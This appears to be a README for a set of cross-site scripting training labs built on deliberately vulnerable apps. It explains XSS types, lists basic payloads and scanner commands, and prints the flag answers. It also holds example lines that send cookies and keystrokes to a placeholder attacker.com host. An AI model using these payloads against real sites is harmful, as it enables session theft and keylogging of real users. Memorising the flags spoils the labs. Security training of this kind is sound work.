# Cross-Site Scripting (XSS) Labs

Master XSS attacks from basic script injection to advanced DOM manipulation and filter bypasses.

## What is Cross-Site Scripting?

Cross-Site Scripting (XSS) is a client-side code injection attack where malicious scripts are injected into trusted websites. When a victim visits the compromised page, the malicious script executes in their browser with the same privileges as the legitimate site.

XSS attacks can:
- Steal session cookies and authentication tokens
- Capture keystrokes and form data
- Redirect users to malicious sites
- Deface websites
- Spread malware
- Perform actions on behalf of the user

## Types of XSS

### 1. Reflected XSS (Non-Persistent)

The malicious script is reflected off a web server in error messages, search results, or any response that includes user input. The payload is delivered via a crafted URL.

**Attack Flow:**
1. Attacker crafts malicious URL with XSS payload
2. Victim clicks the link (phishing, social engineering)
3. Server reflects the payload in the response
4. Victim's browser executes the malicious script

**Example:**
```
http://vulnerable.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (Persistent)

The malicious script is permanently stored on the target server (database, message forum, comment field, etc.). Every user who views the infected content executes the payload.

**Attack Flow:**
1. Attacker submits malicious payload to stored location
2. Application stores the payload
3. Victim views the page containing stored payload
4. Victim's browser executes the malicious script

**Example:** A comment field that accepts:
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

### 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side. The payload is executed as a result of modifying the DOM environment in the victim's browser.

**Attack Flow:**
1. Attacker crafts URL with payload in fragment (#) or parameters
2. Client-side JavaScript processes user input unsafely
3. Browser executes the payload without server involvement

**Example:**
```javascript
// Vulnerable code using innerHTML
// Exploit URL: http://vulnerable.com/page#<img src=x onerror=alert('XSS')>
```

## Lab Series

### Lab 1: Reflected XSS Basics
**Difficulty:** Beginner | **Duration:** 30 min | **Target:** DVWA

Learn the fundamentals:
- Basic `<script>alert()</script>` injection
- Understanding reflection points
- URL encoding payloads
- Simple filter bypass

### Lab 2: Stored XSS Attacks
**Difficulty:** Intermediate | **Duration:** 45 min | **Target:** DVWA, Juice Shop

Persistent attacks:
- Injecting into comment/message fields
- Profile-based XSS
- Cookie theft attacks
- Session hijacking

### Lab 3: DOM-Based XSS
**Difficulty:** Intermediate | **Duration:** 45 min | **Target:** Juice Shop, WebGoat

Client-side exploitation:
- Identifying DOM sinks and sources
- Fragment identifier attacks
- postMessage vulnerabilities
- JavaScript URL handlers

### Lab 4: XSS Filter Bypass
**Difficulty:** Advanced | **Duration:** 1 hr | **Target:** Multiple

Evading security controls:
- Character encoding bypass
- Event handler alternatives
- Tag and attribute variations
- WAF bypass techniques

### Lab 5: XSS to Account Takeover
**Difficulty:** Advanced | **Duration:** 1.5 hrs | **Target:** Juice Shop

Real-world exploitation chains:
- Stealing session tokens
- Keylogging with XSS
- Phishing via XSS
- CSRF via XSS

## Common XSS Contexts

### 1. HTML Context
```html
<!-- Between tags -->
<div>USER_INPUT</div>
Payload: <script>alert('XSS')</script>

<!-- In tag attributes -->
<input value="USER_INPUT">
Payload: "><script>alert('XSS')</script>
```

### 2. JavaScript Context
```javascript
// In string variable
var name = 'USER_INPUT';
Payload: '; alert('XSS');//

// In script block
// Payload: '</script><script>alert('XSS')</script>
```

### 3. URL Context
```html
<a href="USER_INPUT">Click</a>
Payload: javascript:alert('XSS')
```

## Essential Tools

```bash
# XSS payload generators
# Browser Developer Tools - Console and Network tabs
# Burp Suite - Intruder with XSS payloads
# XSStrike - https://github.com/s0md3v/XSStrike
# Dalfox - https://github.com/hahwul/dalfox

# XSStrike usage
python xsstrike.py -u "http://target.com/search?q=test"

# Dalfox usage
dalfox url "http://target.com/search?q=test"
```

## Basic Payloads

```html
<!-- Classic alert -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- IMG tag -->
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">

<!-- SVG tag -->
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>

<!-- Event handlers -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>

<!-- Anchor tag -->
<a href="javascript:alert('XSS')">Click</a>
```

## Impact Demonstrations

### Cookie Stealing
```javascript
// Send cookies to attacker server
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
```

### Keylogger
```javascript
// Capture keystrokes
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log.php?key='+e.key;
}
```

## Defense Techniques (Know Your Enemy)

Understanding defenses helps craft better payloads:

1. **Output Encoding** - HTML entity encoding of special characters
2. **Input Validation** - Whitelist allowed characters/patterns
3. **Content Security Policy (CSP)** - Restricts script execution sources
4. **HTTPOnly Cookies** - Prevents JavaScript access to cookies
5. **Sanitization Libraries** - DOMPurify, OWASP Java HTML Sanitizer

## Flags

| Lab | Flag |
|-----|------|
| Lab 1 - Reflected XSS | `FLAG{r3fl3ct3d_xss_pwn3d}` |
| Lab 2 - Stored XSS | `FLAG{st0r3d_xss_p3rs1st3nt}` |
| Lab 3 - DOM XSS | `FLAG{d0m_xss_cl13nt_s1d3}` |
| Lab 4 - Filter Bypass | `FLAG{f1lt3r_byp4ss_m4st3r}` |
| Lab 5 - Account Takeover | `FLAG{xss_t0_4cc0unt_t4k30v3r}` |

## OWASP References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [OWASP Testing for XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)

## Additional Resources

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
